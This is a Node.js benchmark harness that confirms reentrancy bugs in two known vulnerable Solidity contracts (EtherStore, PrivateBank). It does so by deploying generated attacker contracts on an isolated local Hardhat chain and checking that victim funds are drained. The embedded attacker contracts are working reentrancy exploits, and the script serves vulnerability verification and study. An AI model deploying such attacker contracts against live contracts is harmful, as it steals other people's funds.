'use strict';

const fs = require('node:fs');
const path = require('node:path');
const crypto = require('node:crypto');

const root = process.env.CAMPAIGN_PROJECT_ROOT || path.resolve(__dirname, '..');
const deps = path.join(root, 'flare-scan/contracts/firelight-core/node_modules');
process.env.HARDHAT_CONFIG = path.join(root, 'scripts/local-test-hardhat.cjs');
const hre = require(path.join(deps, 'hardhat'));
const { BrowserProvider, ContractFactory } = require(path.join(deps, 'ethers'));
const solcLoader = require(path.join(root, 'flare-scan/tools/solc-0819/node_modules/solc'));
const solc = solcLoader.setupMethods(require(process.env.CAMPAIGN_SOLJSON));
const { LOCAL_CHAIN_ID, parseForkConfig, publicBoundary } = require('./dynamic-execution-boundary.cjs');

const CASES = Object.freeze({
  '13-etherstore': { source: 'etherstore.sol', contract: 'EtherStore', version: '0.4.10' },
  '16-simple_dao': { source: '0x23a91059fdc9579a9fbd0edc5f2ea0bfdb70deb4.sol', contract: 'PrivateBank', version: '0.4.19' },
});
const WEI = 10n ** 18n;

function digest(value) {
  return crypto.createHash('sha256').update(value).digest('hex');
}

function compile(sources) {
  const input = {
    language: 'Solidity',
    sources,
    settings: {
      optimizer: { enabled: false },
      outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } },
    },
  };
  const output = JSON.parse(solc.compile(JSON.stringify(input)));
  const errors = (output.errors || []).filter((item) => item.severity === 'error');
  if (errors.length) throw new Error(`source_compile_failed:${errors.map((item) => item.formattedMessage).join('\n')}`);
  return output.contracts;
}

function artifact(contracts, sourceName, contractName) {
  const value = contracts?.[sourceName]?.[contractName];
  if (!value?.abi || !value?.evm?.bytecode?.object) throw new Error(`artifact_missing:${sourceName}:${contractName}`);
  return value;
}

function attackerSource(version, caseId) {
  if (caseId === '13-etherstore') return `pragma solidity ${version};
contract IEtherStore {
  function depositFunds() public payable;
  function withdrawFunds(uint256 amount) public;
  function balances(address account) public constant returns (uint256);
}
contract EtherStoreAttacker {
  IEtherStore public target;
  uint public rounds;
  function EtherStoreAttacker(address targetAddress) public { target = IEtherStore(targetAddress); }
  function seed() public payable { target.depositFunds.value(msg.value)(); }
  function attack() public { target.withdrawFunds(1 ether); }
  function() public payable {
    if (rounds < 1) { rounds += 1; target.withdrawFunds(1 ether); }
  }
}`;
  return `pragma solidity ${version};
contract IPrivateBank {
  function Deposit() public payable;
  function CashOut(uint amount) public;
  function balances(address account) public constant returns (uint);
}
contract PrivateBankAttacker {
  IPrivateBank public target;
  uint public rounds;
  function PrivateBankAttacker(address targetAddress) public { target = IPrivateBank(targetAddress); }
  function seed() public payable { target.Deposit.value(msg.value)(); }
  function attack() public { target.CashOut(1 ether); }
  function() public payable {
    if (rounds < 1) { rounds += 1; target.CashOut(1 ether); }
  }
}`;
}

async function deploy(entry, signer, args = []) {
  const contract = await new ContractFactory(entry.abi, entry.evm.bytecode.object, signer).deploy(...args);
  const receipt = await contract.deploymentTransaction().wait();
  if (receipt.status !== 1) throw new Error('benchmark_deployment_failed');
  await contract.waitForDeployment();
  return { contract, receipt };
}

async function run() {
  const caseId = process.argv[2];
  const sourcePath = path.resolve(process.argv[3] || '');
  const spec = CASES[caseId];
  if (!spec || path.basename(sourcePath) !== spec.source) throw new Error('invalid_case_source');
  const source = fs.readFileSync(sourcePath, 'utf8');
  const sourceSha256 = digest(source);
  const compilerRelease = String(process.env.BENCHMARK_SOLC_VERSION || '').split('+', 1)[0];
  if (compilerRelease !== spec.version || solc.version().split('+', 1)[0] !== spec.version) {
    throw new Error(`benchmark_requires_exact_solc_${spec.version}`);
  }
  const compilerArtifactSha256 = String(process.env.BENCHMARK_SOLC_SHA256 || '');
  if (!/^(?:0x)?[a-f0-9]{64}$/i.test(compilerArtifactSha256)) throw new Error('benchmark_compiler_hash_missing');
  const fork = parseForkConfig(process.env);
  if (fork.requested || !fork.valid) throw new Error('benchmark_dynamic_requires_isolated_local_evm');
  if (hre.network.name !== 'hardhat' || hre.network.config.url || hre.network.config.forking) {
    throw new Error('benchmark_evm_not_isolated');
  }

  const harness = attackerSource(spec.version, caseId);
  const sources = { [spec.source]: { content: source }, 'ReentrancyAttacker.sol': { content: harness } };
  const compiled = compile(sources);
  const targetEntry = artifact(compiled, spec.source, spec.contract);
  const attackerName = caseId === '13-etherstore' ? 'EtherStoreAttacker' : 'PrivateBankAttacker';
  const attackerEntry = artifact(compiled, 'ReentrancyAttacker.sol', attackerName);
  const logEntry = caseId === '16-simple_dao' ? artifact(compiled, spec.source, 'Log') : null;

  const provider = new BrowserProvider(hre.network.provider);
  const chainId = Number((await provider.getNetwork()).chainId);
  if (chainId !== LOCAL_CHAIN_ID) throw new Error('benchmark_evm_chain_id_mismatch');
  const attackerSigner = await provider.getSigner(0);
  const victimSigner = await provider.getSigner(1);
  const victimAddress = await victimSigner.getAddress();
  await provider.send('hardhat_setBalance', [victimAddress, '0x8ac7230489e80000']);

  let logAddress = null;
  const transactionHashes = [];
  let target;
  if (caseId === '16-simple_dao') {
    const logDeployment = await deploy(logEntry, attackerSigner);
    logAddress = await logDeployment.contract.getAddress();
    transactionHashes.push(logDeployment.receipt.hash);
    const targetDeployment = await deploy(targetEntry, attackerSigner, [logAddress]);
    target = targetDeployment.contract;
    transactionHashes.push(targetDeployment.receipt.hash);
  } else {
    // The sample's first-withdraw gate is measured from timestamp zero. Advance
    // the isolated chain so the legitimate initial withdrawal is reachable.
    await provider.send('evm_increaseTime', [604801]);
    await provider.send('evm_mine', []);
    const targetDeployment = await deploy(targetEntry, attackerSigner);
    target = targetDeployment.contract;
    transactionHashes.push(targetDeployment.receipt.hash);
  }

  const targetAddress = await target.getAddress();
  const attackerDeployment = await deploy(attackerEntry, attackerSigner, [targetAddress]);
  const exploit = attackerDeployment.contract;
  const exploitAddress = await exploit.getAddress();
  transactionHashes.push(attackerDeployment.receipt.hash);
  const victimFunding = caseId === '13-etherstore'
    ? await (await target.connect(victimSigner).getFunction('depositFunds')({ value: 2n * WEI })).wait()
    : await (await target.connect(victimSigner).getFunction('Deposit')({ value: 2n * WEI })).wait();
  transactionHashes.push(victimFunding.hash);
  const seed = await (await exploit.getFunction('seed')({ value: WEI })).wait();
  transactionHashes.push(seed.hash);
  const beforeTargetBalance = await provider.getBalance(targetAddress, seed.blockNumber);
  const balanceMethod = 'balances';
  const attackerCreditBefore = await target.getFunction(balanceMethod)(exploitAddress);
  const victimCreditBefore = await target.getFunction(balanceMethod)(victimAddress);
  const attackerBalanceBefore = await provider.getBalance(exploitAddress);
  const attack = await (await exploit.getFunction('attack')({ gasLimit: 2_000_000 })).wait();
  transactionHashes.push(attack.hash);
  const afterTargetBalance = await provider.getBalance(targetAddress, attack.blockNumber);
  const attackerBalanceAfter = await provider.getBalance(exploitAddress, attack.blockNumber);
  const attackerCreditAfter = await target.getFunction(balanceMethod)(exploitAddress);
  const victimCreditAfter = await target.getFunction(balanceMethod)(victimAddress);
  const extracted = attackerBalanceAfter - attackerBalanceBefore;
  const profit = extracted - WEI;
  const rounds = await exploit.getFunction('rounds')();
  const timestamp = (await provider.getBlock(attack.blockNumber)).timestamp;
  const confirmed = attack.status === 1
    && beforeTargetBalance === 3n * WEI
    && afterTargetBalance === WEI
    && extracted === 2n * WEI
    && profit === WEI
    && attackerCreditBefore === WEI
    && attackerCreditAfter === (2n ** 256n - WEI)
    && victimCreditBefore === 2n * WEI
    && victimCreditAfter === victimCreditBefore
    && rounds === 1n
    && (caseId !== '13-etherstore' || timestamp >= 604800)
    && (caseId !== '16-simple_dao' || Boolean(logAddress));
  const result = {
    schemaVersion: 1,
    caseId,
    state: confirmed ? 'passed' : 'unconfirmed',
    confirmedVulnerability: confirmed,
    proofScope: confirmed ? 'attacker_profit_and_victim_balance_change' : 'not_confirmed',
    vulnerability: 'reentrancy',
    mode: 'isolated_in_process',
    compilerVersion: solc.version(),
    compilerArtifactSha256,
    compilerKind: 'solc-js-original-source',
    sourceSha256,
    harnessSha256: digest(harness),
    targetAddress,
    logAddress,
    attackerAddress: exploitAddress,
    victimAddress,
    victimFundingWei: (2n * WEI).toString(),
    beforeTargetBalanceWei: beforeTargetBalance.toString(),
    afterTargetBalanceWei: afterTargetBalance.toString(),
    attackerBalanceBeforeAttackWei: attackerBalanceBefore.toString(),
    attackerBalanceAfterAttackWei: attackerBalanceAfter.toString(),
    extractedWei: extracted.toString(),
    profitWei: profit.toString(),
    attackerCreditBeforeWei: attackerCreditBefore.toString(),
    attackerCreditAfterWei: attackerCreditAfter.toString(),
    victimCreditBeforeWei: victimCreditBefore.toString(),
    victimCreditAfterWei: victimCreditAfter.toString(),
    reentryRounds: rounds.toString(),
    attackTimestamp: timestamp,
    transactionHashes,
    executionBoundary: publicBoundary(fork, { chainId, forkState: 'not_performed' }),
    reproduction: caseId === '13-etherstore'
      ? '在本地隔离链将区块时间推进超过一周；受害者存入 2 ETH、攻击合约存入 1 ETH，首次提款在回调中重入一次，验证净获利 1 ETH 且受害者仍挂账 2 ETH。'
      : '部署真实 Log 合约并将其地址传入 PrivateBank；受害者存入 2 ETH、攻击合约存入 1 ETH，CashOut 回调重入一次，验证净获利 1 ETH 且受害者仍挂账 2 ETH。',
    reason: confirmed ? null : 'reentrancy_profit_or_victim_credit_assertion_failed',
  };
  process.stdout.write(`${JSON.stringify(result)}\n`);
  if (!confirmed) process.exitCode = 1;
}

run().catch((error) => {
  process.stderr.write(`${error.stack || error}\n`);
  process.exitCode = 1;
});
